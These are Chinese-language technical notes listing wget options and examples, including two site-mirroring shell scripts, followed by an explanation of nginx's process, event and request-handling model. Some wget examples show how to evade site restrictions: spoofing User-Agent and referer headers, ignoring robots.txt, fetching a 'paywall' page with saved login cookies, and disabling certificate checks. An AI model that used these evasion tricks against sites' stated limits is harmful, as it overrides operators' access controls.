       --ftps-clear-data-connection    cipher the control channel only; all the data will be in plaintext
       --ftps-fallback-to-ftp          fall back to FTP if FTPS is not supported in the target server
WARC options:
       --warc-file=FILENAME        save request/response data to a .warc.gz file
       --warc-header=STRING        insert STRING into the warcinfo record
       --warc-max-size=NUMBER      set maximum size of WARC files to NUMBER
       --warc-cdx                  write CDX index files
       --warc-dedup=FILENAME       do not store records listed in this CDX file
       --no-warc-compression       do not compress WARC files with GZIP
       --no-warc-digests           do not calculate SHA1 digests
       --no-warc-keep-log          do not store the log file in a WARC record
       --warc-tempdir=DIRECTORY    location for temporary files created by the WARC writer

Recursive download:
  -r, --recursive          specify recursive download,递归下载,慎用
  -l, --level=NUMBER       maximum recursion depth(inf or 0 for infinite无穷)
       --delete-after      delete files locally after downloading them
  -k, --convert-links      make links in downloaded HTML or CSS point to local files
       --convert-file-only convert the file part of the URLs only(usually known as the basename)
       --backups=N         before writing file X, rotate up to N backup files
  -K, --backup-converted   before converting file X, back up as X.orig
  -m, --mirror             shortcut for -N -r -l inf --no-remove-listing
  -p, --page-requisites    get all images, etc. needed to display HTML page
       --strict-comments   turn on strict(SGML) handling of HTML comments

Recursive accept/reject:
  -A<后缀名>                      指定要下载文件的后缀名,多个后缀名之间使用逗号进行分隔
  -A, --accept=LIST               comma-separated list of accepted extensions
  -R, --reject=LIST               comma-separated list of rejected extensions
       --accept-regex=REGEX        regex matching accepted URLs
       --reject-regex=REGEX        regex matching rejected URLs
       --regex-type=TYPE           regex type(posix|pcre)
  -D, --domains=LIST              comma-separated list of accepted domains
       --exclude-domains=LIST      comma-separated list of rejected domains
       --follow-ftp                follow FTP links from HTML documents
       --passive-ftp               使用被动模式PASV连接FTP服务器
       --follow-tags=LIST          comma-separated list of followed HTML tags
       --ignore-tags=LIST          comma-separated list of ignored HTML tags
  -H, --span-hosts                go to foreign hosts when recursive
  -L, --relative                  follow relative links only
  -I, --include-directories=LIST  list of allowed directories
       --trust-server-names     use the name specified by the redirection URL's last component
  -X, --exclude-directories=LIST  list of excluded directories
  -np, --no-parent                 don't ascend to the parent directory

【 wget实例 】
格式为: wget [参数] "url"

wget http://www.tip.net/testfile.zip         # 从网络下载一个文件并保存在当前目录
wget http://www.tip.net/download.aspx?id=1   # wget默认会以最后一个符合/的后面的字符来命令
wget --output-document=filename.html example.com
wget -O tip.zip http://www.tip.net/download.aspx?id=1  # 参数-O来指定一个文件名
wget --directory-prefix=folder/subfolder example.com   # 下载一个文件,存到指定的目录
wget -P folder/subfolder example.com

wget --continue example.com/big.file.iso
wget -c http://www.linuxde.net/testfile.zip             # 断点续传,重新启动下载中断的文件
wget --continue --timestamping wordpress.org/latest.zip # 下载一个文件,但只在服务器上的版本比本地版本新时才会真正执行

wget --limit-rate=300k http://www.tip.net/testfile.zip # wget限速下载

wget -b http://www.linuxde.net/testfile.zip  # 后台下载
tail -f wget-log                             # 察看后台下载的进度
wget --tries=40 URL                          # 增加重试次数,默认20次
wget --reject=gif ur          # 过滤指定格式下载,下载一个网站,但不希望下载图片,可以使用这条命令

# 把下载信息存入日志文件,不希望下载信息直接显示在终端
wget -o download.log URL

# 限制总下载文件大小,要下载的文件超过5M时退出下载。单文件下载不起作用,只能递归下载时才有效
wget -Q5m -i filelist.txt

# 下载指定格式文件,下载一个网站的所有图片/所有视频/所有PDF文件
wget -r -A pdf url

# 从网站上一个子目录中下载所有MP3文件
wget --level=1 --recursive --no-parent --accept mp3,MP3 http://example.com/mp3/
wget -l 1 -r -np -A mp3,MP3 http://example.com/mp3/

# 将一个网站上的所有图片下载到同一个目录中
wget --directory-prefix=files/pictures --no-directories --recursive --no-clobber --accept jpg,gif,png,jpeg http://example.com/images/
wget -P files/pictures -nd -r -nc -A jpg,gif,png,jpeg http://example.com/images/

# 从一个网站上下载PDF文件,采用递归的方式,但不跳出指定的网域
wget --mirror --domains=abc.com,files.abc.com,docs.abc.com --accept=pdf http://abc.com/
wget -m -D abc.com,files.abc.com,docs.abc.com -A pdf http://abc.com/

# 从一个网站上下载所有文件,但是排除某些目录
wget --recursive --no-clobber --no-parent --exclude-directories /forums,/support http://example.com
wget -r -nc -np -X /forums,/support http://example.com

# 下载网站目录,解网站的目录结构
wget -r -k -np -l 4 --reject=htm,html,css,js,jpg,jpeg,gif,bmp,png,swf,exe xxx.com

用Wget下载受限内容
Wget可用于下载网站上登陆页面之后的内容,或避开HTTP参照位址(referer)和User Agent字符串对抓屏的限制。

# 下载网站上的文件,假设此网站检查User Agent字符串和HTTP参照位址(referer)
wget --referer=/5.0 --user-agent="Firefox/4.0.1" http://nytimes.com

# 从密码保护网站上下载文件
wget --http-user=labnol --http-password=hello123 http://example.com/secret/file.zip

# 抓取登陆界面后面的页面。需要将用户名和密码替换成实际的表格域值,而URL应该指向(实际的)表格提交页面
wget --cookies=on --save-cookies cookies.txt --keep-session-cookies --post-data 'user=labnol&password=123' http://example.com/login.php
wget --cookies=on --load-cookies cookies.txt --keep-session-cookies http://example.com/paywall

用wget获得文件细节
# 在不下载的情况下,得到一个文件的大小(在网络响应中寻找用字节表示的文件长度)
wget --spider --server-response http://example.com/file.iso
wget --spider -S http://example.com/file.iso

# 得到网页的最后修改日期(检查HTTP头中的Last Modified标签)
wget --server-response --spider http://www.labnol.org/
wget -S --spider http://www.labnol.org/

# 下载一个文件,但不存储为本地文件,而是在屏幕上显示其内容
wget --output-document=- --quiet google.com/humans.txt
wget -O- -q google.com/humans.txt

# 检查你的网站上的链接是否都可用。spider选项将令wget不会在本地保存网页
wget --output-file=logfile.txt --recursive --spider http://example.com
wget -O logfile.txt -r --spider http://example.com

wget —- 如何对服务器友好一些？
wget工具本质上是一个抓取网页的网络爬虫,但有些网站主机通过robots.txt文件来屏幕这些网络爬虫。另外,对于使用了rel-nofollow属性的网页,wget也不会扒取它的链接。
不过,你可以强迫wget忽略robots.txt'和nofollow指令,只需在所有wget命令行中加上–execute robots=off选项即可。如果一个网页主机通过查看User Agent字段来屏幕wget请求,你也总是可以用–user-agent=Mozilla`选项来伪装成火狐浏览器。

wget命令会增加网站服务器的负担,因为它不断地追踪链接,并下载文件。因而,一个好的网页抓取工具应该限制下载速度,而且还要在连接的抓取请求之间设置一个停顿,以缓解服务器的负担。
wget --limit-rate=20k --wait=60 --random-wait --mirror example.com
# 将下载带宽限制在了20KB/s,而且wget会在任意位置随机停顿30s至90s时间,然后再开始下一次下载请求。

# 伪装代理名称下载
wget --user-agent="Mozilla/5.0(Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16(KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16" http://www.linuxde.net/testfile.zip

# 想要让wget忽略robots.txt的规则就加上-e robots=off,-e等同于临时修改wgetrc里的内容
网站管理员加上robots.txt经常是因为负载的考虑,所以加上--wait 1来减少我们的下载对服务器的负担

# 测试下载链接是否有效
wget --spider URL
可以在以下几种情况下使用--spider参数:
定时下载之前进行检查
间隔检测网站是否可用
检查网站页面的死链接

# 从服务器下载一些以连续序号为文件名的文件
wget http://example.com/images/{1..20}.jpg
wget http://example.com/images/pre-{1..20}-post.jpg

# 下载多个文件,这些网址存于一个文本文件中,一行一个网址
wget --input list-of-file-urls.log
wget -i filelist.txt

# 镜像网站,用wget做站点镜像
wget --mirror -p --convert-links -P ./LOCAL URL  下载整个网站到本地。
--miror开户镜像下载。
-p下载所有为了html页面显示正常的文件。
--convert-links下载后,转换成本地的链接。
-P ./LOCAL保存所有文件和目录到本地指定目录。

如果想制作镜像站点可以使用-m参数,如 wget -m http://place.your.url/here
这时wget会自动判断合适的参数来制作镜像站点,wget会登录到服务器上读入robots.txt并按其规定来执行

用Wget对网站进行镜像备份
下载一个网页,包括它所有的内容,比如样式表和包含的图片,它们是确保网页离线显示所必需的
wget -page-requisites --span-hosts --convert-links --adjust-extension http://example.com/dir/file
wget -p -H -k -E http://example.com/dir/file

下载整个网站,包括它所有链接的页面和文件
wget --execute robots=off --recursive --no-parent --continue --no-clobber http://example.com/
wget -e robots=off -r -np -c -nc http://example.com/

wget -r -p -np -k http://dsec.pku.edu.cn/~usr_name/
# 或者
wget -m http://www.tldp.org/LDP/abs/html/

wget -e robots=off -w 1 -x -np -p -m -k -t 1 -X/blog/user http://www.example.com/blog/
为了让这个命令行的各选项意义更加明确,它还可以写成:
wget --execute robots=off --wait=1 --force-directories --no-parent --page-requisites --mirror --convert-links --tries=1 --exclude /blog/user http://www.example.com/blog/

# 在不稳定的网络上下载一个部分下载的文件,以及在空闲时段下载
wget -t 0 -w 31 -c http://dsec.pku.edu.cn/BBC.avi -o down.log &
# 或者从filelist读入要下载的文件列表
wget -t 0 -w 31 -c -B ftp://dsec.pku.edu.cn/linuxsoft -i filelist.txt -o down.log &

# FTP下载,可以使用wget来完成ftp链接的下载。
wget ftp-url                                          # 使用wget匿名ftp下载
wget --ftp-user=USERNAME --ftp-password=PASSWORD url  # 使用wget用户名和密码认证的ftp下载

# 利用代理服务器进行下载
使用代理下载
wget -Y on -p -k https://sourceforge.net/projects/wvware/

如果用户的网络需要经过代理服务器,那么可以让wget通过代理服务器进行文件的下载。此时需要在当前用户的目录下创建一个.wgetrc文件。文件中可以设置代理服务器:
http-proxy = 111.111.111.111:8080
ftp-proxy = 111.111.111.111:8080
分别表示http的代理服务器和ftp的代理服务器。如果代理服务器需要密码则使用:
–proxy-user=USER设置代理用户
–proxy-passwd=PASS设置代理密码
这两个参数。
使用参数–proxy=on/off 使用或者关闭代理。

# 下载指定页面的图片文件,grep –E 使用正则表达式,grep –i 不区分大小写,grep –o 只显示匹配的字符串
curl -s news.baidu.com | grep -Eoi '(http|https|ftp)://[a-z0-9./_]*(jpg|png|gif)' | sort | uniq > url.txt && wget -q -nc -i url.txt

</pre><textarea>#!/bin/sh
ADDR="http://www.w3school.com.cn"
if [ $1 ]    
then
  ADDR=$1
fi
SERVER=${ADDR#http://}
SERVER=${SERVER%%/*}
wget -bc \
  --html-extension \
  --restrict-file-names=windows \
  --convert-links \
  --page-requisites \
  --execute robots=off \
  --mirror \
  --exclude-directories /try \
  --user-agent="Chrome/10.0.648.204" \
  --no-check-certificate \
  --reject "aggregator*" \
  -o $SERVER.log \
  $ADDR 2>&1 &
wait
find $SERVER -type f -name "*.css" -exec cat {} \; |
grep -o 'url(/[^)]*)' |
sort |
uniq |
sed 's/^url(/(.*/)$/http:////'$SERVER'/1/' |
wget --mirror --page-requisites -i -

for i in `find $SERVER -type f -name "*.css"`; do
  PREFIX="$(echo $i | sed 's/[^//]*//g; s///$//; s////../////g')"
  sed -i 's/url(///url('$PREFIX'/g' $i
done

# 第3行设置要下载的网站的地址
# 第10行将文件名转换为windows兼容的格式也可以兼容unix系统,windows对文件名格式的要求比unix苛刻,wget的这个功能稍微弱了一点,面对一些更苛刻的系统就没有办法了。
# 第13行用于忽略robots.txt。很多网站的css、js文件都是在robots.txt中被定义为spider不可访问的。
# 第15、16行用于忽略某些目录和文件。因为没有了robots.txt的限制,wget可能会去访问一些不需要的东西,这里可以根据具体情况做限制。
# 第19~24行下载css中链接的文件。
# 第26~29行修正css中的链接

</textarea><textarea>#!/bin/bash
wget \
  -d \
  -o wget_pic_keke.log \
  -nd \
  -nc \
  -r \
  -l 4 \
  -H \
  -p \
  -np \
  -A jpg \
  --domains=www.keke123.cc,pic.keke12345.info \
  --limit-rate=1024k \
  -P ./pictures_keke \
  -c \
  --wait=1 \
  -e robots=off \
  --user-agent="Mozilla/5.0(Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16(KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16" \
  "http://www.keke123.cc/";

  # the picture in the first page is depth 2
  # which depth? the second page theme picture
  # http://pic.keke12345.info/picss/2018/allimg/180412/12191950-1-194Q.jpg

</textarea>
</div>

<div id="nginx">
<h2>nginx 在nginx根目录执行nginx -t,否则可能报错</h2><pre>
Nginx("engine x")是一款轻量级高性能的Web服务器、反向代理服务器及电子邮件(IMAP/POP3)代理服务器,并在一个BSD-like协议下发行,特点是占内存少、并发能力强,使用nginx的网站用户有百度、京东、新浪、网易、腾讯、淘宝等

1、作为Web服务器
相比Apache,Nginx使用更少的资源,支持更多的并发连接,体现更高的效率,这点使Nginx尤其受到虚拟主机提供商的欢迎,能够支持高达50000个并发连接数的响应得益于Nginx选择epoll and kqueue作为开发模型

2、作为反向代理负载均衡服务器
Nginx既可以在内部直接支持Rails和PHP,也可以支持作为HTTP代理服务器对外进行服务。Nginx用C编写,系统资源开销和CPU使用效率都比Perlbal好的多

3、作为邮件代理服务器
Nginx也是一个非常优秀的邮件代理服务器,最早开发这个产品的目的之一也是作为邮件代理服务器

【 Nginx做为HTTP服务器有以下几项基本特性 】
1、处理静态文件、索引文件及自动索引;打开文件描述符缓冲
2、无缓存的反向代理加速,简单的负载均衡和容错
3、FastCGI,简单的负载均衡和容错
4、模块化的结构,包括gzipping,byte ranges,chunked responses及SSI-filter等filter。如果由FastCGI或其它代理服务器处理单页中存在的多个SSI,则这项处理可以并行运行,而不需要相互等待。
5、支持SSL和TLSSNI

Nginx安装简单,配置文件简洁,还能够支持perl语法,Bugs非常少的服务器

Nginx专为性能优化而开发,性能是其最重要的考量,实现上非常注重效率,支持内核Poll模型,能经受高负载的考验,支持高达50000个并发连接数。

Nginx具有很高的稳定性。其它HTTP服务器当遇到访问的峰值或有人恶意发起慢速连接时,也很可能会导致服务器物理内存耗尽频繁交换,失去响应,只能重启服务器。例如当前apache一旦上到200个以上进程,web响应速度就明显非常缓慢了。而Nginx采取了分阶段资源分配技术,使得它的CPU与内存占用率非常低。保持10000个没有活动的连接只占2.5M内存,所以类似DOS这样的攻击对Nginx来说基本上是毫无用处的

Nginx支持热部署,启动特别容易,几乎可以做到7*24不间断运行,即使运行数个月也不需要重新启动,还能在不间断服务的情况下升级软件版本

Nginx采用master-slave模型,能够充分利用SMP的优势,且能够减少工作进程在磁盘I/O的阻塞延迟,当采用select()/poll()调用时还可以限制每个进程的连接数。

Nginx代码质量非常高,代码很规范,模块扩展也很容易,特别是强大的Upstream与Filter链。Upstream为诸如reverse proxy、与其他服务器通信模块的编写奠定了很好的基础。而Filter链最酷的部分就是各个filter不必等待前一个filter执行完毕,它可以把前一个filter的输出做为当前filter的输入,这有点像Unix的管线,这意味一个模块可以开始压缩从后端服务器发送过来的请求,且可以在模块接收完后端服务器的整个请求之前把压缩流转向客户端

【 nginx架构、进程模型、事件模型 】
Nginx的高性能与其架构是分不开的
Nginx的基本架构：master/worker模型
Nginx使用一个多进程模型来对外提供服务,一个master进程可生成一或多个worker进程;每个worker基于时间驱动机制可以并行响应多个请求
master进程负责管理Nginx本身和其他worker进程、加载配置文件、平滑升级等
worker:http服务、http代理、fastcgi代理等,所有实际上的业务处理逻辑都在worker进程,worker进程中有一个函数执行无限循环,不断处理收到的来自客户端的请求并进行处理,直到整个Nginx服务被停止

Nginx启动后在unix系统中会以daemon的方式在后台运行,后台进程包含一个master进程和多个worker进程,也可以手动地关掉后台模式让Nginx在前台运行,并且通过配置让Nginx取消master进程,从而可以使Nginx以单进程方式运行。生产环境下肯定不会这么做,所以关闭后台模式一般是用来调试用的。所以Nginx是以多进程的方式来工作的,当然Nginx也是支持多线程的方式的,只是主流的方式还是多进程的方式,也是Nginx的默认方式

master进程主要用来管理worker进程,包含：接收来自外界的信号,向各worker进程发送信号,监控worker进程的运行状态,当worker进程异常情况下退出后会自动重新启动新的worker进程。而基本的网络事件则是放在worker进程中来处理了。多个worker进程之间是对等的,他们同等竞争来自客户端的请求,各进程互相之间是独立的。一个请求只可能在一个worker进程中处理,一个worker进程不可能处理其它进程的请求。worker进程的个数是可以设置的,一般会设置与机器cpu核数一致,这里面的原因与Nginx的进程模型以及事件处理模型是分不开的

Nginx启动后要怎么操作Nginx？
master管理worker进程,所以只需要与master进程通信就行了。master进程会接收来自外界发来的信号,再根据信号做不同的事情。所以要控制Nginx,只需要通过kill向master进程发送信号即可,如kill -HUP pid则告诉Nginx从容地重启Nginx,一般用这个信号来重启Nginx或重新加载配置,服务是不中断的。
master进程在接收到HUP信号后先重新加载配置文件,然后再启动新的worker进程,并向所有老的worker进程发送信号,告诉他们可以光荣退休了。新的worker在启动后就开始接收新的请求,而老的worker在收到来自master的信号后就不再接收新的请求,并且在当前进程中的所有未处理完的请求处理完成后再退出。
直接给master进程发送信号,这是比较老的操作方式,Nginx在0.8版本之后引入了一系列命令行参数来方便管理,比如./nginx -s reload重启Nginx,./nginx -s stop停止Nginx的运行,执行reload命令时是启动一个新的Nginx进程,而新的Nginx进程在解析到reload参数后就知道是控制Nginx来重新加载配置文件了,它会向master进程发送信号,然后接下来的动作就和直接向master进程发送信号一样了。

worker进程是如何处理请求的呢？
worker进程之间是平等的,每个进程处理请求的机会也是一样的。当提供80端口的http服务时,一个连接请求过来,每个进程都有可能处理这个连接
每个worker进程都是从master进程fork过来,在master进程里面先建立好需要listen的socket(listenfd)之后,然后再fork出多个worker进程。所有worker进程的listenfd会在新连接到来时变得可读,为保证只有一个进程处理该连接,所有worker进程在注册listenfd读事件前抢accept_mutex,抢到互斥锁的那个进程注册listenfd读事件,在读事件里调用accept接受该连接。当一个worker进程在accept这个连接之后就开始读取请求、解析请求、处理请求,产生数据后再返回给客户端,最后才断开连接,这样一个完整的请求就是这样的了。可以看到一个请求完全由worker进程来处理,而且只在一个worker进程中处理。

Nginx采用这种进程模型有什么好处呢？
首先对于每个worker进程来说,独立的进程不需要加锁,所以省掉了锁带来的开销,同时在编程以及问题查找时也会方便很多
其次采用独立的进程,可以让互相之间不会影响,一个进程退出后其它进程还在工作,服务不会中断,master进程则很快启动新的worker进程。当然worker进程的异常退出肯定是程序有bug了,异常退出会导致当前worker上的所有请求失败,不过不会影响到所有请求,所以降低了风险

Nginx是如何处理事件的？
Nginx采用多worker的方式来处理请求,每个worker里面只有一个主线程,那能够处理的并发数很有限啊,多少个worker就能处理多少个并发,何来高并发呢？
Nginx采用了异步非阻塞的方式来处理请求,也就是说Nginx是可以同时处理成千上万个请求的。
apache的常用工作方式(apache也有异步非阻塞版本,但因其与自带某些模块冲突,所以不常用),每个请求会独占一个工作线程,当并发数上到几千时就同时有几千的线程在处理请求了,这对操作系统来说是个不小的挑战,线程带来的内存占用非常大,线程的上下文切换带来的cpu开销很大,自然性能就上不去了,而这些开销完全是没有意义的。

为什么Nginx可以采用异步非阻塞的方式来处理呢,或者异步非阻塞到底是怎么回事呢？
先看一个请求的完整过程。首先请求过来,要建立连接,然后再接收数据,接收数据后再发送数据。具体到系统底层就是读写事件,而当读写事件没有准备好时必然不可操作,如果不用非阻塞的方式来调用,那就得阻塞调用了,事件没有准备好,那就只能等了,等事件准备好了再继续。阻塞调用会进入内核等待,cpu就会让出去给别人用了,对单线程的worker来说显然不合适,当网络事件越多时大家都在等待,cpu空闲下来没人用,cpu利用率自然上不去了,更别谈高并发了。如果加进程数就跟apache的线程模型没区别,不应该增加无谓的上下文切换。所以在Nginx里面,最忌讳阻塞的系统调用了,不要阻塞就非阻塞
非阻塞就是事件没有准备好马上返回EAGAIN,告诉你事件还没准备好,过会再来。过一会再来检查一下事件,直到事件准备好了为止,在这期间就可以先去做其它事情,然后再来看看事件好了没。虽然不阻塞了,但得不时地过来检查一下事件的状态,可以做更多的事情了,但带来的开销也是不小的。所以才会有了异步非阻塞的事件处理机制,具体到系统调用就是像select/poll/epoll/kqueue这样的系统调用。它们提供了一种机制,让你可以同时监控多个事件,调用他们是阻塞的,但可以设置超时时间,在超时时间之内如果有事件准备好了就返回,这种机制正好解决了上面的两个问题,拿epoll为例,当事件没准备好时放到epoll里面,事件准备好了就去读写,当读写返回EAGAIN时将它再次加入到epoll里面。这样只要有事件准备好了就去处理它,只有当所有事件都没准备好时才在epoll里面等着。这样就可以并发处理大量的并发了,当然这里的并发请求是指未处理完的请求,线程只有一个,所以同时能处理的请求当然只有一个了,只是在请求间进行不断地切换而已,切换也是因为异步事件未准备好而主动让出的。这里的切换是没有任何代价,可以理解为循环处理多个准备好的事件,事实上就是这样的。
与多线程相比,这种事件处理方式是有很大的优势的,不需要创建线程,每个请求占用的内存也很少,没有上下文切换,事件处理非常的轻量级,并发数再多也不会导致无谓的资源浪费(上下文切换)。更多的并发数,只是会占用更多的内存而已。
对连接数进行过测试,在24G内存的机器上,处理的并发请求数达到过200万。现在网络服务器基本都采用这种方式,这也是nginx性能高效的主要原因。

推荐设置worker的个数为cpu的核数,更多的worker数只会导致进程来竞争cpu资源了,从而带来不必要的上下文切换,而且nginx为了更好的利用多核特性,提供了cpu亲缘性的绑定选项,可以将某一个进程绑定在某一个核上,这样就不会因为进程的切换带来cache的失效。像这种小的优化在Nginx中非常常见,同时也说明了Nginx作者的苦心孤诣。比如Nginx在做4个字节的字符串比较时会将4个字符转换成一个int型再作比较,以减少cpu的指令数等等。

知道了Nginx为什么会选择这样的进程模型与事件模型了。对于一个基本的Web服务器来说,事件通常有三种类型:网络事件、信号、定时器,其中网络事件通过异步非阻塞可以很好的解决掉,如何处理信号与定时器？

信号的处理
对Nginx来说有一些特定的信号代表着特定的意义。信号会中断掉程序当前的运行,在改变状态后继续执行。如果是系统调用则可能会导致系统调用的失败,需要重入。对于Nginx来说,如果nginx正在等待事件(epoll_wait时),如果程序收到信号,在信号处理函数处理完后,epoll_wait会返回错误,然后程序可再次进入epoll_wait调用。

定时器
由于epoll_wait等函数在调用的时候是可以设置一个超时时间的,所以Nginx借助这个超时时间来实现定时器。nginx里面的定时器事件是放在一颗维护定时器的红黑树里面,每次在进入epoll_wait前,先从该红黑树里面拿到所有定时器事件的最小时间,在计算出epoll_wait的超时时间后进入epoll_wait。所以当没有事件产生也没有中断信号时,epoll_wait会超时,也就是说定时器事件到了。这时nginx会检查所有的超时事件,将他们的状态设置为超时,然后再去处理网络事件。由此可以看出写Nginx代码时,在处理网络事件的回调函数时,通常做的第一个事情就是判断超时,然后再去处理网络事件。

事件驱动：epoll(Linux),kqueue(FreeBSD),/dev/poll(Solaris)
消息通知：select,poll,rt signals
支持sendfile,sendfile64
支持AIO,mmap

【 Nginx基础概念 】
connection
在Nginx中connection就是对tcp连接的封装,其中包括连接的socket、读事件、写事件。利用Nginx封装的connection可以很方便的使用Nginx处理与连接相关的事情,比如建立连接、发送与接受数据等。Nginx中的http请求的处理就是建立在connection之上的,所以Nginx不仅可以作为一个web服务器,也可以作为邮件服务器,利用Nginx提供的connection可以与任何后端服务打交道。

结合一个tcp连接的生命周期看看Nginx是如何处理一个连接的
首先Nginx在启动时会解析配置文件得到需要监听的端口与ip地址,然后在Nginx的master进程里面,先初始化好这个监控的socket(创建socket,设置addrreuse等选项,绑定到指定的ip地址端口,再listen),然后再fork出多个子进程出来,然后子进程会竞争accept新的连接。此时客户端就可以向Nginx发起连接了,当客户端与服务端通过三次握手建立好一个连接后,Nginx的某一个子进程会accept成功,得到这个建立好的连接的socket,然后创建Nginx对连接的封装,即ngx_connection_t结构体,接着设置读写事件处理函数并添加读写事件来与客户端进行数据的交换。最后Nginx或客户端来主动关掉连接,到此一个连接就结束了。

Nginx也是可以作为客户端来请求其它server的数据的(如upstream模块),此时与其它server创建的连接也封装在ngx_connection_t中。作为客户端Nginx先获取一个ngx_connection_t结构体,然后创建socket,并设置socket的属性(比如非阻塞),然后再通过添加读写事件,调用connect/read/write来调用连接,最后关掉连接并释放ngx_connection_t

在Nginx中每个进程会有一个连接数的最大上限,这个上限与系统对fd的限制不一样。在操作系统中通过ulimit -n可以得到一个进程所能够打开的fd的最大数即nofile,因为每个socket连接会占用掉一个fd,所以这也会限制进程的最大连接数,当然也会直接影响到程序所能支持的最大并发数,当fd用完后再创建socket时就会失败。Nginx通过设置worker_connectons来设置每个进程支持的最大连接数。如果该值大于nofile,那么实际的最大连接数是nofile,Nginx会有警告。Nginx在实现时是通过一个连接池来管理的,每个worker进程都有一个独立的连接池,连接池的大小是worker_connections。这里的连接池里面保存的其实不是真实的连接,它只是一个worker_connections大小的一个 ngx_connection_t结构的数组。并且Nginx会通过一个链表free_connections来保存所有的空闲ngx_connection_t,每次获取一个连接时就从空闲连接链表中获取一个,用完后再放回空闲连接链表里面。

一个Nginx能建立的最大连接数,应该是worker_connections * worker_processes。这里说的是最大连接数,对于HTTP请求本地资源来说,能够支持的最大并发数量是worker_connections * worker_processes,而如果是HTTP作为反向代理来说,最大并发数量应该是worker_connections * worker_processes/2。因为作为反向代理服务器,每个并发会建立与客户端的连接和与后端服务的连接会占用两个连接。

一个客户端连接过来后,多个空闲的进程会竞争这个连接,这种竞争会导致不公平,如果某个进程得到accept的机会比较多,它的空闲连接很快就用完了,如果不提前做一些控制,当accept到一个新的tcp连接后,因为无法得到空闲连接,而且无法将此连接转交给其它进程,最终会导致此tcp连接得不到处理就中止掉了。这是不公平的,有的进程有空余连接却没有处理机会,有的进程因为没有空余连接却人为地丢弃连接。
如何解决这个问题呢？
首先,Nginx的处理得先打开accept_mutex选项,此时只有获得了accept_mutex的进程才会去添加accept事件,也就是说,Nginx会控制进程是否添加accept事件。Nginx使用一个叫ngx_accept_disabled的变量来控制是否去竞争accept_mutex锁。在第一段代码中,计算ngx_accept_disabled的值,这个值是Nginx单进程的所有连接总数的八分之一,减去剩下的空闲连接数量,得到的这个ngx_accept_disable 有一个规律,当剩余连接数小于总连接数的八分之一时,其值才大于0,而且剩余的连接数越小,这个值越大。再看第二段代码,当ngx_accept_disabled大于0时,不会去尝试获取accept_mutex锁,并且将ngx_accept_disabled减1,于是每次执行到此处时都会去减1,直到小于0。不去获取 accept_mutex 锁,就是等于让出获取连接的机会,很显然可以看出,当空余连接越少时,ngx_accept_disable越大,于是让出的机会就越多,这样其它进程获取锁的机会也就越大。不去accept,自己的连接就控制下来了,其它进程的连接池就会得到利用,这样,Nginx 就控制了多进程间连接的平衡了。

request
request在Nginx中指的是http请求,具体到Nginx中的数据结构是ngx_http_request_t,ngx_http_request_t是对一个http请求的封装。一个http请求包含请求行、请求头、请求体、响应行、响应头、响应体。

http请求是典型的请求-响应类型的的网络协议,而http是文本协议,所以在分析请求行与请求头及输出响应行与响应头,往往是一行一行的进行处理。如果自己写一个http服务器,通常在一个连接建立好后,客户端会发送请求过来。然后读取一行数据,分析出请求行中包含的method、uri、http_version信息。然后再一行一行处理请求头,并根据请求method与请求头的信息来决定是否有请求体以及请求体的长度,然后再去读取请求体。得到请求后处理请求产生需要输出的数据,然后再生成响应行,响应头以及响应体。在将响应发送给客户端之后,一个完整的请求就处理完了。当然这是最简单的webserver的处理方式,其实Nginx也是这样做的,只是有一些小小的区别,比如当请求头读取完成后就开始进行请求的处理了。Nginx通过ngx_http_request_t来保存解析请求与输出响应相关的数据。

Nginx是如何处理一个完整的请求的
一个请求是从ngx_http_init_request开始的,这个函数会设置读事件为ngx_http_process_request_line,也就是说接下来的网络事件会由ngx_http_process_request_line来执行。通过ngx_http_read_request_header来读取请求数据。然后调用ngx_http_parse_request_line函数来解析请求行。Nginx为提高效率,采用状态机来解析请求行,而且在进行method的比较时没有直接使用字符串比较,而是将四个字符转换成一个整型以减少cpu的指令数。一个请求行包含请求的方法、uri、版本,其实在请求行中也是可以包含有host的,比如一个请求GET http://www.taobao.com/uri HTTP/1.0这样一个请求行也是合法的,而且host是www.taobao.com,这时Nginx会忽略请求头中的host域,而以请求行中的这个为准来查找虚拟主机。在后面解析请求头时协议版本都是1.0或1.1。整个请求行解析到的参数会保存到ngx_http_request_t结构当中。

在解析完请求行后,Nginx会设置读事件的handler为ngx_http_process_request_headers,然后后续的请求就在ngx_http_process_request_headers中进行读取与解析。ngx_http_process_request_headers函数用来读取请求头,跟请求行一样,还是调用ngx_http_read_request_header来读取请求头,调用ngx_http_parse_header_line来解析一行请求头,解析到的请求头会保存到ngx_http_request_t的域headers_in中,headers_in是一个链表结构,保存所有的请求头。而HTTP中有些请求是需要特别处理的,这些请求头与请求处理函数存放在一个映射表里面即ngx_http_headers_in,在初始化时会生成一个hash表,当每解析到一个请求头后就会先在这个hash表中查找,如果有找到则调用相应的处理函数来处理这个请求头,比如:Host头的处理函数是ngx_http_process_host。

当Nginx解析到两个回车换行符时就表示请求头的结束,此时就会调用ngx_http_process_request来处理请求了。ngx_http_process_request会设置当前的连接的读写事件处理函数为ngx_http_request_handler,然后再调用ngx_http_handler来真正开始处理一个完整的http请求。读写事件处理函数都是ngx_http_request_handler,这个函数中会根据当前事件是读事件还是写事件,分别调用ngx_http_request_t中的read_event_handler或write_event_handler。由于此时请求头已经读取完成了,Nginx先不读取请求body,所以这里面设置read_event_handler为ngx_http_block_reading,即不读取数据了。真正开始处理数据是在ngx_http_handler函数里面,这个函数会设置write_event_handler为ngx_http_core_run_phases,并执行ngx_http_core_run_phases函数。ngx_http_core_run_phases函数将执行多阶段请求处理,Nginx将一个http请求的处理分为多个阶段,那么这个函数就是执行这些阶段来产生数据。因为ngx_http_core_run_phases最后会产生数据,所以就很容易理解为什么设置写事件的处理函数为ngx_http_core_run_phases。
简要说明了一下函数的调用逻辑,需要明白最终是调用ngx_http_core_run_phases来处理请求,产生的响应头会放在ngx_http_request_t的headers_out中。Nginx的各种阶段会对请求进行处理,最后会调用filter来过滤数据,对数据进行加工,如truncked传输、gzip压缩等。这里的filter包括header filter与body filter,即对响应头或响应体进行处理。filter是一个链表结构,分别有header filter与body filter,先执行header filter中的所有filter,然后再执行body filter中的所有filter。在header filter中的最后一个filter,即ngx_http_header_filter,这个filter将会遍历所有的响应头,最后需要输出的响应头在一个连续的内存,然后调用ngx_http_write_filter进行输出。ngx_http_write_filter是body filter中的最后一个,所以Nginx首先的body信息,在经过一系列的body filter之后,最后也会调用ngx_http_write_filter来进行输出

